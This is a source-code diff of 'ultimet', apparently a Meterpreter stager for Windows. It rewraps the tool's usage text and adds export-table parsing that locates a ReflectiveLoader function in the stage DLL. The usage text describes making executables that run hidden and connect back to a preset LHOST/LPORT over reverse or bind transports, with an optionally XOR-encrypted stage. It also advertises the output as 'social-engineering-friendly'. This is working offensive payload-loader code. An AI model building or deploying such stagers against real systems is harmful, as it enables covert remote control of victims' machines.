@@ -146,7 +146,7 @@ bool UnicodeToAnsi(char* ascii, const wchar_t* unicode)
 
 void print_header()
 {
-	printf("****************************************************\n");
+	printf("\n****************************************************\n");
 	printf("[+] [ultimet] - The Ultimate Meterpreter Executable\n");
 	printf("[+] v0.25.1 - Revolution  \n");
 	printf("****************************************************\n");
@@ -163,58 +163,68 @@ void usage()
 		"\nConnection settings:\n"
 		"\t-h\tLHOST\tIP or a hostname.\n"
 		"\t-p\tLPORT\tPort number.\"\n"
-		"\t-t\tTRANSPORT \"reverse_tcp\", \"reverse_metsvc\", \"reverse_http\", \"reverse_https\",\n\t\t\t  \"bind_tcp\" or \"bind_metsvc\"\n"
+		"\t-t\tTRANSPORT \"reverse_tcp\", \"reverse_metsvc\", \"reverse_http\",\n"
+		"\t\t\t  \"reverse_https\",\"bind_tcp\" or \"bind_metsvc\"\n"
 
 		"\nHTTP(S) Specific settings `optional`:\n"
-		"\t-ua\tU_AGENT\t User-Agent, enclose in `\"\"` if contains spaces.\n"
-		"\t-et\tSECONDS\t Session expiration timeout in seconds.\n"
-		"\t-ct\tSECONDS\t Communication expiration timeout in seconds.\n"
+		"\t-ua\tU_AGENT\tUser-Agent, enclose in `\"\"` if contains spaces.\n"
+		"\t-et\tSECONDS\tSession expiration timeout in seconds.\n"
+		"\t-ct\tSECONDS\tCommunication expiration timeout in seconds.\n"
 
-		"\nCreating social-engineering-friendly exe files with `built-in` settings \"i.e. msfpayload-like exe\":\n"
-		"\t--msfpayload\tWhen this is specified along with the connection parameters, a new exe will be\n"
-		"\t\t\tcreated with the following naming convention: TRANSPORT-LHOST-LPORT.exe, \n"
-		"\t\t\tthis newly created exe will execute silently according to the predefined settings.\n"
-		"\t\t\t ... it's gonna be just like the exe files you get out of msfpayload, on steroids:)\n"
-		"\t--reset\t\tA new exe will be created `ultimet_reset.exe` with pre-defined\n"
-		"\t        \tsettings cleared `undo -> --msfpayload`.\n"
+		"\nMSFPAYLOAD-like functionality:\n"
+		"\t--msfpayload\tWhen this is specified along with the connection\n"
+		"\t\t\tparameters, new exe will be created with the following\n"
+		"\t\t\tnaming convention:TRANSPORT-LHOST-LPORT.exe, \n"
+		"\t\t\tthis newly created exe will execute silently according\n"
+		"\t\t\tto the predefined settings.\n"
+		"\t\t\t ... it's gonna be just like the exe files you get out\n"
+		"\t\t\t of msfpayload ... on steroids :)\n"
+		"\t--reset\t\tA new exe will be created `ultimet_reset.exe` with\n"
+		"\t\t\tpre-defined settings cleared `undo -> --msfpayload`.\n"
 		
 		"\nStage options:\n"
 		"\t-f\tFILE\tForces loading the stage from a file.\n"
 		"\t\t\tNote: The file can be a regular metsrv.dll,\n"
 		"\t\t\tor an encrypted one using the ultimet_xor.exe utility.\n"
-		"\t--remove-stage\tCreates a new exe `ultimet_no_stage.exe` with stage resource removed,\n"
-		"\t\t\tit will resut in smaller file, but metsvc family of payloads won't be available.\n"
+		"\t--remove-stage\tCreates a new exe `ultimet_no_stage.exe` with stage\n"
+		"\t\t\tresource removed, it will resut in smaller file, but\n"
+		"\t\t\tmetsvc family of payloads won't be available.\n"
 		"\t\t\tTo re-attach the resource ... use a resource editor.\n"
 
 		"\nGeneral notes:\n"
-		" - If you find the console window disappears immediatly when you run ultimet, this\n"
-		"   means it found valid connection settings built-in, to get rid of this behaviour,\n"
-		"   run `ultimet.exe --reset` and you'll get a new pristine `ultimet_reset.exe`.\n"
-		" - The exe file created with `--msfpayload` option is a fully functional ultimet.exe,\n"
-		"   but it will run hidden and doesn't require connection parameters to be specified since\n"
-		"   they're preconfigured, to reset that exe to its norm, just specify `--reset` and a fresh\n"
-		"   exe will be created with default settings.\n"
+		" - If you find the console window disappears immediatly when you run ultimet,\n"
+		"   this means it found valid connection settings built-in, to get rid of this\n"
+		"   behaviour, `ultimet.exe --reset` will create a pristine `ultimet_reset.exe`.\n"
+		" - The exe file created with `--msfpayload` option is a fully functional\n"
+		"   ultimet.exe, it will run hidden and doesn't require connection parameters\n"
+		"   to be specified since they're preconfigured, to reset that exe to its norm,\n"
+		"   just specify `--reset` and a fresh exe will be created with default settings\n"
 		" - If you're on a shell [not a console], you have to start the program using:\n"
 		"   \"start /b ultimet.exe ...\" or you'll lose your shell.\n"
 		" - For the reverse_metsvc & bind_metsvc options, stage has to be available\n"
 		"   upfront, either through the bundled resource or loaded usng the \"-f\" option\n"
 		" - The most reliable handler for reverse_metsvc is:\n"
-		"   \"windows/metsvc_reverse_tcp\" ... using reverse_metsvc to connect to a \"reverse_tcp\" *might* work,\n"
-		"   but not always, so, use reverse_metsvc with windows/metsvc_reverse_tcp.\n"
-		" - Same applies to bind_metsvc:\n"
-		"  \"windows/metsvc_bind_tcp\" ... using bind_metsvc to connect to a \"bind_tcp\" *might* work,\n"
-		"   but not always, so, use bind_metsvc with windows/metsvc_metsvc_tcp...\n"
+		"   \"windows/metsvc_reverse_tcp\" ... using reverse_metsvc to connect to a\n"
+		"   \"reverse_tcp\" *might* work, but not always, so, use reverse_metsvc with\n"
+		"   windows/metsvc_reverse_tcp ... same applies to bind_metsv.\n"
 
 		"\nAdvanced notes:\n"
-		" - ultimet utilizes resources to include the stage, and to store connection settings internally.\n"
+		" - ultimet utilizes resources to include the stage, and to store connection\n"
+		"   settings internally.\n"
 		" - The stage `metsvc.dll` is stored in a resource `BINARY` and ID `101`,\n"
-		"   stage can be the plain metsvc.dll file or encrypted using ultimet_xor.exe utility.\n"
-		" - Options are stored in a resource `BINARY` and ID `103` using the following convention:\n"
-		"   |UM|TRANSPORT|LHOST|LPORT|\n"
-		" - You can use your favourite resource editor to create/edit those resources as you please.\n"
+		"   stage can be the plain metsvc.dll file or encrypted using ultimet_xor.exe\n"
+		"   utility.\n"
+		" - Options are stored in a resource `BINARY` and ID `103` using the following\n"
+		"   convention: `|UM|TRANSPORT|LHOST|LPORT|` <- leave \"|UM|\" as it is since\n"
+		"   it's used inernally, and change connection settings as you like.\n"
+		" - You can use your favourite resource editor to create/edit those resources as\n"
+		"   you please.\n"
 
 		"\nContributors:\n"
-		" - Anwar Mohamed \"@anwarelmakrahy\" - Added support for metsvc_bind_tcp & bind_tcp.\n"
+		" - Anwar Mohamed \"@anwarelmakrahy\"\n"
+		"   . Added support for metsvc_bind_tcp & bind_tcp.\n"
+		"   . Added support for run-time parsing and patching of ReflectiveLoader\n"
+		"     Bootstrap.\n"
 
 		);
 };
@@ -225,7 +235,7 @@ DWORD ReflectiveLoaderOffset(DWORD BaseAddress){
 	PIMAGE_NT_HEADERS pImageHeader;
 	PIMAGE_EXPORT_DIRECTORY PExportDirectory;
 
-	DWORD RDLLAddress;
+	//DWORD RDLLAddress;
 
     pDosHeader = (PIMAGE_DOS_HEADER)BaseAddress;
     pImageHeader = (PIMAGE_NT_HEADERS)(BaseAddress + pDosHeader->e_lfanew);
@@ -237,12 +247,29 @@ DWORD ReflectiveLoaderOffset(DWORD BaseAddress){
 	PDWORD ExportNames = (PDWORD)(RVAToOffset(pImageHeader, PExportDirectory->AddressOfNames) + BaseAddress);
 	PWORD ExportOrdinals = (PWORD)(RVAToOffset(pImageHeader, PExportDirectory->AddressOfNameOrdinals) + BaseAddress);
 
+	char *check = nullptr;
+	char *tempPointer = nullptr;
+	bool gotcha = false;
+	DWORD address = 0;
 	for (DWORD i =0; i<PExportDirectory->NumberOfFunctions; i++) {
-		std::cout << (char*)(DWORD*)RVAToOffset(pImageHeader,ExportNames[i]) + BaseAddress << std::endl;
+		//std::cout << (char*)(DWORD*)RVAToOffset(pImageHeader,ExportNames[i]) + BaseAddress << std::endl;
+		//std::cout << (PDWORD)RVAToOffset(pImageHeader,ExportFunctions[ExportOrdinals[i]]) + BaseAddress << std::endl;
+		check = ((char*)(DWORD*)RVAToOffset(pImageHeader,ExportNames[i]) + BaseAddress);
+		tempPointer = strstr(check,"ReflectiveLoader");
+		if(tempPointer != nullptr && check != nullptr)
+		{
+			gotcha = true;
+			address = (DWORD)RVAToOffset(pImageHeader,ExportFunctions[ExportOrdinals[i]]);
+			break;
+		}
 
-            std::cout << (PDWORD)RVAToOffset(pImageHeader,ExportFunctions[ExportOrdinals[i]]) + BaseAddress << std::endl;
-    }
-	return false;
+    } 
+	if (gotcha) 
+	{
+		dprintf(L"[*] ReflectiveDll function offset found: 0x%08x\n", address);
+		return address;
+	}
+	else return 0x153e; //hardcoded from original metsrv.dll... we have not tested these functions thoroughly yet.
 };
 
 
